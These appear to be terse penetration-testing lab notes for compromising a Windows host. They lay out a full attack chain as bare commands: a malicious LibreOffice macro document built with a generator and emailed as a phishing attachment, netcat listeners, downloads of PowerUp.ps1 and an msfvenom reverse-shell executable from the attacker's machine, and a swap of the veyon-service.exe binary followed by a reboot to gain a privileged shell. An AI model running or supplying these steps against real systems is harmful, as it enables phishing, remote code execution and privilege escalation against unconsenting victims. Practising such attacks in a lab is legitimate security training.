git clone [0bfxgh0st/MMG-LO: Malicious Macro Generator for LibreOffice/OpenOffice](https://github.com/0bfxgh0st/MMG-LO/)
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1


python3 mmg-ods.py windows 192.168.kali.ip 80     <==> nc -lvnp 80


sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.53.140 -u 'Spreadsheet' -m 'Here is your requested spreadsheet' -a 'file.ods'

###Aug 19 20:02:22 kali sendemail[4250]: Email was sent successfully!

certutil -urlcache -f http://192.168.kali.ip:8000/PowerUp.ps1 PowerUp.ps1
==> . .\PowerUp.ps1


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.53 LPORT=4444 -f exe > rev.exe

iwr -uri http://192.168.kali.ip:8000/rev.exe -Outfile rev.exe

Rename veyon-service.exe to .old
Rename rev.exe to veyon-service.exe


nc -lvnp 4444 <==> shutdown -r -t 0 